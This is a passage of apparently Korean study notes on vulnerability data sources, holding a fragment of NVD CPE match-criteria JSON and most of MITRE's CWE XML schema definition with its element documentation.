90F46D-9A07-47ED-9A61-C82CBF823D55","criteria":"cpe:2.3:a:project-redcap:redcap:5.1.0:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"EAB2C9C2-F685-450B-9980-553966FC3B63","criteria":"cpe:2.3:a:sun:jre:*:update3:*:*:*:*:*:*","versionEndIncluding":"1.6.0","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active","matches":[{"cpeName":"cpe:2.3:a:sun:jre:1.3.0:update3:*:*:*:*:*:*","cpeNameId":"2D284534-DA21-43D5-9D89-07F19AE400EA"},{"cpeName":"cpe:2.3:a:sun:jre:1.4.1:update3:*:*:*:*:*:*","cpeNameId":"CE55E1DF-8EA2-41EA-9C51-1BAE728CA094"},{"cpeName":"cpe:2.3:a:sun:jre:1.4.2:update3:*:*:*:*:*:*","cpeNameId":"A09C4E47-6548-40C5-8458-5C07C3292C86"},{"cpeName":"cpe:2.3:a:sun:jre:1.5.0:update3:*:*:*:*:*:*","cpeNameId":"C484A93A-2677-4501-A6E0-E4ADFFFB549E"},{"cpeName":"cpe:2.3:a:sun:jre:1.6.0:update3:*:*:*:*:*:*","cpeNameId":"C518A954-369E-453E-8E17-2AF639150115"}]}},{"matchString":{"matchCriteriaId":"A0879188-265F-44C5-9652-E1494B2845C9","criteria":"cpe:2.3:a:boxcar_media:shopping_cart:*:*:*:*:*:*:*:*","lastModified":"2019-06-17T09:16:33.960","cpeLastModified":"2019-07-22T16:37:38.133","created":"2019-06-17T09:16:33.960","status":"Active"}},{"matchString":{"matchCriteriaId":"DD38B1D2-5860-4CE2-A33F-BAF27C2F3B34","criteria":"cpe:2.3:o:cisco:ios:12.1\\(14\\)e7:*:*:*:*:*:*:
    ```
    

### CWE

- 데이터 스키마
    
    https://cwe.mitre.org/data/xsd/cwe_schema_latest.xsd
    
    ```xml
    This XML file does not appear to have any style information associated with it. The document tree is shown below.
    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:cwe="http://cwe.mitre.org/cwe-7" xmlns:xhtml="http://www.w3.org/1999/xhtml" targetNamespace="http://cwe.mitre.org/cwe-7" elementFormDefault="qualified" attributeFormDefault="unqualified" version="7.2">
    <xs:import namespace="http://www.w3.org/1999/xhtml" schemaLocation="http://www.w3.org/2002/08/xhtml/xhtml1-strict.xsd"/>
    <xs:annotation>
    <xs:documentation>The CWE Schema is maintained by The MITRE Corporation and developed in partnership with the public CWE Community. For more information, including how to get involved in the project and how to submit change requests, please visit the CWE website at https://cwe.mitre.org.</xs:documentation>
    <xs:appinfo>
    <schema>Core Definition</schema>
    <version>7.2</version>
    <date>July 16, 2024</date>
    <terms_of_use>Copyright (c) 2006-2024, The MITRE Corporation. All rights reserved. The contents of this file are subject to the terms of the CWE License located at https://cwe.mitre.org/about/termsofuse.html. See the CWE License for the specific language governing permissions and limitations for use of this schema. When distributing copies of the CWE Schema, this license header must be included.</terms_of_use>
    </xs:appinfo>
    </xs:annotation>
    <!--  ===============================================================================  -->
    <!--  ===============================================================================  -->
    <!--  ===============================================================================  -->
    <xs:element name="Weakness_Catalog">
    <xs:annotation>
    <xs:documentation>The Weakness_Catalog root element is used to describe a collection of security issues known as weaknesses (e.g., flaws, faults, bugs). Each catalog can be organized by optional Views and Categories. The catalog also contains a list of all External_References that may be shared throughout the individual weaknesses. The required Name and Version attributes are used to uniquely identify the catalog. The required Date attribute identifies the date when this catalog was created or last updated.</xs:documentation>
    </xs:annotation>
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Weaknesses" minOccurs="0" maxOccurs="1">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Weakness" type="cwe:WeaknessType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    <xs:element name="Categories" minOccurs="0" maxOccurs="1">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Category" type="cwe:CategoryType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    <xs:element name="Views" minOccurs="0" maxOccurs="1">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="View" type="cwe:ViewType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    <xs:element name="External_References" minOccurs="0" maxOccurs="1">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="External_Reference" type="cwe:ExternalReferenceType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    <xs:attribute name="Name" type="xs:string" use="required"/>
    <xs:attribute name="Version" type="xs:string" use="required"/>
    <xs:attribute name="Date" type="xs:date" use="required"/>
    </xs:complexType>
    <xs:unique name="uniqueWeaknessID">
    <xs:selector xpath="./cwe:Weaknesses/cwe:Weakness"/>
    <xs:field xpath="@ID"/>
    </xs:unique>
    <xs:unique name="uniqueWeaknessName">
    <xs:selector xpath="./cwe:*/cwe:*"/>
    <xs:field xpath="@Name"/>
    </xs:unique>
    <xs:unique name="uniqueCategoryID">
    <xs:selector xpath="./cwe:Categories/cwe:Category"/>
    <xs:field xpath="@ID"/>
    </xs:unique>
    <xs:unique name="uniqueViewID">
    <xs:selector xpath="./cwe:Views/cwe:View"/>
    <xs:field xpath="@ID"/>
    </xs:unique>
    <xs:unique name="uniqueReferenceID">
    <xs:selector xpath="./cwe:External_References/cwe:External_Reference"/>
    <xs:field xpath="@Reference_ID"/>
    </xs:unique>
    </xs:element>
    <!--  ===============================================================================  -->
    <!--  =================================  WEAKNESS  ==================================  -->
    <!--  ===============================================================================  -->
    <xs:complexType name="WeaknessType">
    <xs:annotation>
    <xs:documentation>A weakness is a mistake or condition that, if left unaddressed, could under the proper conditions contribute to a cyber-enabled capability being vulnerable to attack, allowing an adversary to make items function in unintended ways. This complexType is used to describe a specific type of weakness and provide a variety of information related to it.</xs:documentation>
    <xs:documentation>The required Description should be short and limited to the key points that define this weakness. The optional Extended_Description element provides a place for additional details important to this weakness, but that are not necessary to convey the fundamental concept behind the weakness. A number of other optional elements are available, each of which is described in more detail within the corresponding complexType that it references.</xs:documentation>
    <xs:documentation>The required ID attribute provides a unique identifier for the entry. It is considered static for the lifetime of the entry. If this entry becomes deprecated, the identifier will not be reused. The required Name attribute is a string that identifies the entry. The name should focus on the weakness being described and should avoid mentioning the attack that exploits the weakness or the consequences of exploiting the weakness. All words in the entry name should be capitalized except for articles and prepositions, unless they begin or end the name. Subsequent words in a hyphenated chain are also not capitalized. The required Abstraction attribute defines the abstraction level for this weakness. The required Structure attribute defines the structural nature of the weakness. The required Status attribute defines the maturity of the information for this weakness.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Description" type="xs:string" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Extended_Description" type="cwe:StructuredTextType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Related_Weaknesses" type="cwe:RelatedWeaknessesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Weakness_Ordinalities" type="cwe:WeaknessOrdinalitiesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Applicable_Platforms" type="cwe:ApplicablePlatformsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Background_Details" type="cwe:BackgroundDetailsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Alternate_Terms" type="cwe:AlternateTermsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Modes_Of_Introduction" type="cwe:ModesOfIntroductionType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Exploitation_Factors" type="cwe:ExploitationFactorsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Likelihood_Of_Exploit" type="cwe:LikelihoodEnumeration" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Common_Consequences" type="cwe:CommonConsequencesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Detection_Methods" type="cwe:DetectionMethodsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Potential_Mitigations" type="cwe:PotentialMitigationsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Demonstrative_Examples" type="cwe:DemonstrativeExamplesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Observed_Examples" type="cwe:ObservedExampleType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Functional_Areas" type="cwe:FunctionalAreasType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Affected_Resources" type="cwe:AffectedResourcesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Taxonomy_Mappings" type="cwe:TaxonomyMappingsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Related_Attack_Patterns" type="cwe:RelatedAttackPatternsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="References" type="cwe:ReferencesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Mapping_Notes" type="cwe:MappingNotesType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Notes" type="cwe:NotesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Content_History" type="cwe:ContentHistoryType" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="ID" type="xs:integer" use="required"/>
    <xs:attribute name="Name" type="xs:string" use="required"/>
    <xs:attribute name="Abstraction" type="cwe:AbstractionEnumeration" use="required"/>
    <xs:attribute name="Structure" type="cwe:StructureEnumeration" use="required"/>
    <xs:attribute name="Status" type="cwe:StatusEnumeration" use="required"/>
    <xs:attribute name="Diagram" type="xs:string"/>
    </xs:complexType>
    <!--  ===============================================================================  -->
    <!--  =================================  CATEGORY  ==================================  -->
    <!--  ===============================================================================  -->
    <xs:complexType name="CategoryType">
    <xs:annotation>
    <xs:documentation>A category is a collection of weaknesses based on some common characteristic or attribute. The shared attribute may be any number of things including, but not limited to, environment (J2EE, .NET), functional area (authentication, cryptography) and the relevant resource (credentials management, certificate issues). A Category is used primarily as an organizational mechanism for CWE and should not be mapped to by external sources.</xs:documentation>
    <xs:documentation>The required Summary element contains the key points that define the category and helps the user understand what the category is attempting to be. The optional Relationships element is used to define relationships (Member_Of and Has_Member) with other weaknesses, categories, and views. The optional Taxonomy_Mappings element is used to relate this category to similar categories in taxomomies outside of CWE. The optional References element is used to provide further reading and insight into this category. This element should be used when the category is based on external sources or projects. The optional Notes element is used to provide additional comments or clarifications that cannot be captured using the other elements of the category. The optional Content_History element is used to keep track of the original author of the category and any subsequent modifications to the content. This provides a means of contacting the authors and modifiers for clarifying ambiguities, or in merging overlapping contributions.</xs:documentation>
    <xs:documentation>The required ID attribute provides a unique identifier for the category. It is meant to be static for the lifetime of the category. If the category becomes deprecated, the ID should not be reused, and a placeholder for the deprecated category should be left in the catalog. The required Name attribute provides a descriptive title used to give the reader an idea of what characteristics this category represents. All words in the name should be capitalized except for articles and prepositions unless they begin or end the name. The required Status attribute defines the maturity of the information for this category. Please refer to the StatusEnumeration simple type for a list of valid values and their meanings.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Summary" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Relationships" type="cwe:RelationshipsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Taxonomy_Mappings" type="cwe:TaxonomyMappingsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="References" type="cwe:ReferencesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Mapping_Notes" type="cwe:MappingNotesType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Notes" type="cwe:NotesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Content_History" type="cwe:ContentHistoryType" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="ID" type="xs:integer" use="required"/>
    <xs:attribute name="Name" type="xs:string" use="required"/>
    <xs:attribute name="Status" type="cwe:StatusEnumeration" use="required"/>
    </xs:complexType>
    <!--  ===============================================================================  -->
    <!--  ===================================  VIEW  ====================================  -->
    <!--  ===============================================================================  -->
    <xs:complexType name="ViewType">
    <xs:annotation>
    <xs:documentation>A view represents a perspective with which one might look at the weaknesses in the catalog. There are three different types of views as defined by the type attribute: graphs, explicit slices, and implicit slices. The members of a view are either defined externally through the members element (in the case of a graph or an explicit slice) or by the optional filter element (in the case of an implicit slice).</xs:documentation>
    <xs:documentation>The required Objective element describes the perspective from which the view has been constructed. The optional Audience element provides a reference to the target stakeholders or groups for whom the view is most relevant. The optional Members element is used to define Member_Of relationships with categories. The optional Filter element is only used for implicit slices (see the Type attribute) and holds an XSL query for identifying which entries are members of the view. The optional References element is used to provide further reading and insight into this view. This element should be used when the view is based on external sources or projects. The optional Notes element is used to provide any additional comments that cannot be captured using the other elements of the view. The optional Content_History element is used to keep track of the original author of the view and any subsequent modifications to the content. This provides a means of contacting the authors and modifiers for clarifying ambiguities, or in merging overlapping contributions.</xs:documentation>
    <xs:documentation>The required ID attribute provides a unique identifier for the view. It is meant to be static for the lifetime of the view. If the view becomes deprecated, the ID should not be reused, and a placeholder for the deprecated view should be left in the catalog. The required Name attribute provides a descriptive title used to give the reader an idea of what perspective this view represents. All words in the name should be capitalized except for articles and prepositions, unless they begin or end the name. The required Type attribute describes how this view is being constructed. Please refer to the ViewTypeEnumeration simple type for a list of valid values and their meanings. The required Status attribute defines the maturity of the information for this view. Please refer to the StatusEnumeration simple type for a list of valid values and their meanings.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Objective" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Audience" type="cwe:AudienceType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Members" type="cwe:RelationshipsType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Filter" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="References" type="cwe:ReferencesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Mapping_Notes" type="cwe:MappingNotesType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Notes" type="cwe:NotesType" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Content_History" type="cwe:ContentHistoryType" minOccurs="1" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="ID" type="xs:integer" use="required"/>
    <xs:attribute name="Name" type="xs:string" use="required"/>
    <xs:attribute name="Type" type="cwe:ViewTypeEnumeration" use="required"/>
    <xs:attribute name="Status" type="cwe:StatusEnumeration" use="required"/>
    </xs:complexType>
    <!--  ===============================================================================  -->
    <!--  =============================  EXTERNAL REFERENCE =============================  -->
    <!--  ===============================================================================  -->
    <xs:complexType name="ExternalReferenceType">
    <xs:annotation>
    <xs:documentation>The ExternalReferenceType complex type defines a collection of elements that provide a pointer to where more information and deeper insight can be obtained. Examples would be a research paper or an excerpt from a publication.</xs:documentation>
    <xs:documentation>Not all of the elements need to be used, since some are designed for web references and others are designed for book references. The Author and Title elements should be filled out for all references if possible; Author is optional, but Title is required. The optional Edition element identifies the edition of the material being referenced in the event that multiple editions of the material exist. If the reference is part of a magazine or journal, the Publication element should be used to identify the name. The optional Publication_Year, Publication_Month, Publication_Day, and Publisher elements should be used to more specifically identify the book or publication via its date and publisher. The year must follow the YYYY format while the month must follow the --MM format and the day must follow the ---DD format. The URL and URL_Date elements are used to capture a URL for the material being referenced, if one exists, and the date when the URL was validated to exist.</xs:documentation>
    <xs:documentation>The required Reference_ID attribute exists to provide a globally unique identifier for the reference (e.g., REF-1). The ID is used by other entities to link to this external reference.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Author" type="xs:string" minOccurs="0" maxOccurs="unbounded"/>
    <xs:element name="Title" type="xs:string" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Edition" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Publication" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Publication_Year" type="xs:gYear" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Publication_Month" type="xs:gMonth" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Publication_Day" type="xs:gDay" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Publisher" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="URL" type="xs:anyURI" minOccurs="0" maxOccurs="1"/>
    <xs:element name="URL_Date" type="xs:date" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Reference_ID" type="xs:string" use="required"/>
    </xs:complexType>
    <!--  ===============================================================================  -->
    <!--  ===============================  GLOBAL TYPES  ================================  -->
    <!--  ===============================================================================  -->
    <xs:complexType name="AffectedResourcesType">
    <xs:annotation>
    <xs:documentation>The AffectedResourcesType complex type is used to identify system resources that can be affected by an exploit of this weakness. If multiple resources could be affected, then each should be defined by its own Affected_Resource element.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Affected_Resource" type="cwe:ResourceEnumeration" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="AlternateTermsType">
    <xs:annotation>
    <xs:documentation>The AlternateTermsType complex type indicates one or more other names used to describe this weakness. The required Term element contains the actual alternate term. The required Description element provides context for each alternate term by which this weakness may be known.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Alternate_Term" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Term" type="xs:string" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Description" type="cwe:StructuredTextType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="ApplicablePlatformsType">
    <xs:annotation>
    <xs:documentation>The ApplicablePlatformsType complex type specifies the languages, operating systems, architectures, and technologies in which a given weakness could appear. A technology represents a generally accepted feature of a system and often refers to a high-level functional component within a system. The required Prevalence attribute identifies the regularity with which the weakness is applicable to that platform. When providing an operating system name, an optional Common Platform Enumeration (CPE) identifier can be used to a identify a specific OS.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Language" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="Name" type="cwe:LanguageNameEnumeration"/>
    <xs:attribute name="Class" type="cwe:LanguageClassEnumeration"/>
    <xs:attribute name="Prevalence" type="cwe:PrevalenceEnumeration" use="required"/>
    </xs:complexType>
    </xs:element>
    <xs:element name="Operating_System" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="Name" type="cwe:OperatingSystemNameEnumeration"/>
    <xs:attribute name="Version" type="xs:string"/>
    <xs:attribute name="CPE_ID" type="xs:string"/>
    <xs:attribute name="Class" type="cwe:OperatingSystemClassEnumeration"/>
    <xs:attribute name="Prevalence" type="cwe:PrevalenceEnumeration" use="required"/>
    </xs:complexType>
    </xs:element>
    <xs:element name="Architecture" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="Name" type="cwe:ArchitectureNameEnumeration"/>
    <xs:attribute name="Class" type="cwe:ArchitectureClassEnumeration"/>
    <xs:attribute name="Prevalence" type="cwe:PrevalenceEnumeration" use="required"/>
    </xs:complexType>
    </xs:element>
    <xs:element name="Technology" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:attribute name="Name" type="cwe:TechnologyNameEnumeration"/>
    <xs:attribute name="Class" type="cwe:TechnologyClassEnumeration"/>
    <xs:attribute name="Prevalence" type="cwe:PrevalenceEnumeration" use="required"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="AudienceType">
    <xs:annotation>
    <xs:documentation>The AudienceType complex type provides a reference to the target stakeholders or groups for a view. For each stakeholder, the required Type element specifies the type of members that might be interested in the view. The required Description element provides some text describing what properties of the view this particular stakeholder might find useful.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Stakeholder" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Type" type="cwe:StakeholderEnumeration" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Description" type="xs:string" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="BackgroundDetailsType">
    <xs:annotation>
    <xs:documentation>The BackgroundDetailsType complex type contains one or more Background_Detail elements, each of which contains information that is relevant but not related to the nature of the weakness itself.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Background_Detail" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="CommonConsequencesType">
    <xs:annotation>
    <xs:documentation>The CommonConsequencesType complex type is used to specify individual consequences associated with a weakness. The required Scope element identifies the security property that is violated. The optional Impact element describes the technical impact that arises if an adversary succeeds in exploiting this weakness. The optional Likelihood element identifies how likely the specific consequence is expected to be seen relative to the other consequences. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact. The optional Note element provides additional commentary about a consequence.</xs:documentation>
    <xs:documentation>The optional Consequence_ID attribute is used by the internal CWE team to uniquely identify examples that are repeated across any number of individual weaknesses. To help make sure that the details of these common examples stay synchronized, the Consequence_ID is used to quickly identify those examples across CWE that should be identical. The identifier is a string and should match the following format: CC-1.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Consequence" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Scope" type="cwe:ScopeEnumeration" minOccurs="1" maxOccurs="unbounded"/>
    <xs:element name="Impact" type="cwe:TechnicalImpactEnumeration" minOccurs="1" maxOccurs="unbounded"/>
    <xs:element name="Likelihood" type="cwe:LikelihoodEnumeration" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Note" type="cwe:StructuredTextType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Consequence_ID" type="xs:string"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="ContentHistoryType">
    <xs:annotation>
    <xs:documentation>The ContentHistoryType complex type provides elements to keep track of the original author of an entry and any subsequent modifications to the content. The required Submission element is used to identify the submitter and/or their organization, the date on which the submission was made, the CWE version and release date in which the new CWE entry was added, and any optional comments related to an entry. The optional Modification element is used to identify a modifier's name, organization, the date on which the Modification was made or suggested, the CWE version and release date in which the modification first appeared, and any related comments. A new Modification element should exist for each change made to the content. Modifications that change the meaning of the entry, or how it might be interpreted, should be marked with an importance of critical to bring it to the attention of anyone previously dependent on the weakness. The optional Contribution element is used to identify a contributor's name, organization, the date, the CWE version and release date in which the contribution first appeared, and any related comments. This element has a single Type attribute, which indicates whether the contribution was part of general feedback given or actual content that was donated. The optional Previous_Entry_Name element is used to describe a previous name that was used for the entry. This should be filled out whenever a substantive name change occurs. The required Date attribute lists the date on which this name was no longer used, typically the date of the first CWE release that changed the previous name. A Previous_Entry_Name element should align with a corresponding Modification element.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Submission">
    <xs:complexType>
    <xs:sequence>
    <xs:choice>
    <xs:sequence>
    <xs:element name="Submission_Name" type="xs:string" minOccurs="1"/>
    <xs:element name="Submission_Organization" type="xs:string" minOccurs="0"/>
    </xs:sequence>
    <xs:element name="Submission_Organization" type="xs:string" minOccurs="1"/>
    </xs:choice>
    <xs:element name="Submission_Date" type="xs:date"/>
    <xs:element name="Submission_Version" type="xs:string"/>
    <xs:element name="Submission_ReleaseDate" type="xs:date"/>
    <xs:element name="Submission_Comment" type="xs:string" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    <xs:element name="Modification" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Modification_Name" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Modification_Organization" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Modification_Date" type="xs:date" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Modification_Version" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Modification_ReleaseDate" type="xs:date" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Modification_Importance" type="cwe:ImportanceEnumeration" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Modification_Comment" type="xs:string" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    </xs:complexType>
    </xs:element>
    <xs:element name="Contribution" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Contribution_Name" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Contribution_Organization" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Contribution_Date" type="xs:date" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Contribution_Version" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Contribution_ReleaseDate" type="xs:date" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Contribution_Comment" type="xs:string" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Type" use="required">
    <xs:simpleType>
    <xs:restriction base="xs:string">
    <xs:enumeration value="Content"/>
    <xs:enumeration value="Feedback"/>
    </xs:restriction>
    </xs:simpleType>
    </xs:attribute>
    </xs:complexType>
    </xs:element>
    <xs:element name="Previous_Entry_Name" minOccurs="0" maxOccurs="unbounded">
    <xs:complexType>
    <xs:simpleContent>
    <xs:extension base="xs:string">
    <xs:attribute name="Date" type="xs:date" use="required"/>
    <xs:attribute name="Version" type="xs:string"/>
    </xs:extension>
    </xs:simpleContent>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="DemonstrativeExamplesType">
    <xs:annotation>
    <xs:documentation>The DemonstrativeExamplesType complex type contains one or more Demonstrative_Example elements, each of which contains an example illustrating how a weakness may look in actual code. The optional Title_Text element provides a title for the example. The Intro_Text element describes the context and setting in which this code should be viewed, summarizing what the code is attempting to do. The Body_Text and Example_Code elements are a mixture of code and explanatory text about the example. The References element provides additional information.</xs:documentation>
    <xs:documentation>The optional Demonstrative_Example_ID attribute is used by the internal CWE team to uniquely identify examples that are repeated across any number of individual weaknesses. To help make sure that the details of these common examples stay synchronized, the Demonstrative_Example_ID is used to quickly identify those examples across CWE that should be identical. The identifier is a string and should match the following format: DX-1.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Demonstrative_Example" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Title_Text" type="xs:string" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Intro_Text" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:choice minOccurs="0" maxOccurs="unbounded">
    <xs:element name="Body_Text" type="cwe:StructuredTextType"/>
    <xs:element name="Example_Code" type="cwe:StructuredCodeType"/>
    </xs:choice>
    <xs:element name="References" type="cwe:ReferencesType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Demonstrative_Example_ID" type="xs:string"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="DetectionMethodsType">
    <xs:annotation>
    <xs:documentation>The DetectionMethodsType complex type is used to identify methods that may be employed to detect this weakness, including their strengths and limitations. The required Method element identifies the particular detection method being described. The required Description element is intended to provide some context of how this method can be applied to a specific weakness. The optional Effectiveness element says how effective the detection method may be in detecting the associated weakness. This assumes the use of best-of-breed tools, analysts, and methods. There is limited consideration for financial costs, labor, or time. The optional Effectiveness_Notes element provides additional discussion of the strengths and shortcomings of this detection method.</xs:documentation>
    <xs:documentation>The optional Detection_Method_ID attribute is used by the internal CWE team to uniquely identify methods that are repeated across any number of individual weaknesses. To help make sure that the details of these common methods stay synchronized, the Detection_Method_ID is used to quickly identify those Detection_Method elements across CWE that should be identical. The identifier is a string and should match the following format: DM-1.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Detection_Method" minOccurs="1" maxOccurs="unbounded">
    <xs:complexType>
    <xs:sequence>
    <xs:element name="Method" type="cwe:DetectionMethodEnumeration" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Description" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="1"/>
    <xs:element name="Effectiveness" type="cwe:DetectionEffectivenessEnumeration" minOccurs="0" maxOccurs="1"/>
    <xs:element name="Effectiveness_Notes" type="cwe:StructuredTextType" minOccurs="0" maxOccurs="1"/>
    </xs:sequence>
    <xs:attribute name="Detection_Method_ID" type="xs:string"/>
    </xs:complexType>
    </xs:element>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="ExploitationFactorsType">
    <xs:annotation>
    <xs:documentation>The ExploitationFactorsType complex type points out conditions or factors that could increase the likelihood of exploit for this weakness.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
    <xs:element name="Exploitation_Factor" type="cwe:StructuredTextType" minOccurs="1" maxOccurs="unbounded"/>
    </xs:sequence>
    </xs:complexType>
    <xs:complexType name="FunctionalAreasType">
    <xs:annotation>
    <xs:documentation>The FunctionalAreasType complex type contains one or more functional_area elements, each of which identifies the functional area in which the weakness is most likely to occur. For example, CWE-23: Relative Path Traversal may occur in functional areas of software related to file processing. Each applicable functional area should have a new Functional_Area element, and standard title capitalization should be applied to each area.</xs:documentation>
    </xs:annotation>
    <xs:sequence>
